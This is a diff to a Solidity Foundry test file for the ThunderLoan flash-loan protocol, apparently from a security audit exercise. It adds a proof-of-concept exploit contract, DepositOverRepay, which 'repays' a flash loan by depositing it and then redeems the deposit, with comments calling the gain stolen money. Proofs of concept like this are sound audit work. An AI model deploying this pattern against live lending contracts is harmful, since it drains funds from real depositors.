@@ -165,6 +165,56 @@ contract ThunderLoanTest is BaseTest {
         //   mflr.feeOne() 148073705159559194 => 1.48073705159559194e17
         //   mflr.feeTwo() 66093895772631111 =>6.6093895772631111e16
     }
+
+    function testDepositOverReplay() public setAllowedToken hasDeposits {
+        vm.startPrank(user);
+        uint256 amountToBorrow = 50e18;
+        uint256 fees = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
+        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
+        tokenA.mint(address(dor), fees);
+        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
+        dor.redeemMoney();
+        vm.stopPrank();
+        assertGe(tokenA.balanceOf(address(dor)), amountToBorrow + fees);
+        // 50.15718582989109e18 stolen money
+        // 50.15e18 amountToBorrow + fees
+        console.log("amountToBorrow + fees", (amountToBorrow + fees));
+    }
+}
+/*//////////////////////////////////////////////////////////////
+                             TEST-CONTRACTS
+    //////////////////////////////////////////////////////////////*/
+
+contract DepositOverRepay is IFlashLoanReceiver {
+    ThunderLoan thunderLoan;
+    address s_token;
+    AssetToken assetToken;
+
+    constructor(address _thunderloan) {
+        thunderLoan = ThunderLoan(_thunderloan);
+    }
+
+    function executeOperation(
+        address token,
+        uint256 amount,
+        uint256 fee,
+        address, /*initiator*/
+        bytes calldata /*params*/
+    )
+        external
+        returns (bool)
+    {
+        s_token = token;
+        IERC20(s_token).approve(address(thunderLoan), 1000e19);
+        thunderLoan.deposit(IERC20(token), amount + fee);
+    }
+
+    function redeemMoney() public {
+        assetToken = thunderLoan.getAssetFromToken(IERC20(s_token));
+        uint256 assetTokenAmount = assetToken.balanceOf(address(this));
+        thunderLoan.redeem(IERC20(s_token), assetTokenAmount);
+        // console.log(assetTokenAmount);
+    }
 }
 
 contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
